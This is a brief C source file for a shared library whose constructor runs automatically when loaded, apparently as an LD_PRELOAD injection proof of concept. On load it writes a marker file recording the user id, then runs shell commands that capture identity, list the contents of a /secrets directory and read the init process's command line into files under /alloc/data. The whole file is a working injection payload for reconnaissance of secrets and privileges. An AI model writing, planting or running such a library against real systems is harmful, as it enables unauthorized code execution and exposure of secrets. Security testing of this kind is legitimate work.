#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void h(void){
  FILE*f=fopen("/tmp/ld_preload_fired","w");
  if(f){ fprintf(f,"FIRED uid=%d\n",getuid()); fclose(f); }
  system("id > /alloc/data/ldp_$(id -u).txt 2>&1; ls -la /secrets > /alloc/data/ldp_secrets.txt 2>&1; cat /proc/1/cmdline > /alloc/data/ldp_p1cmd.txt 2>&1");
}
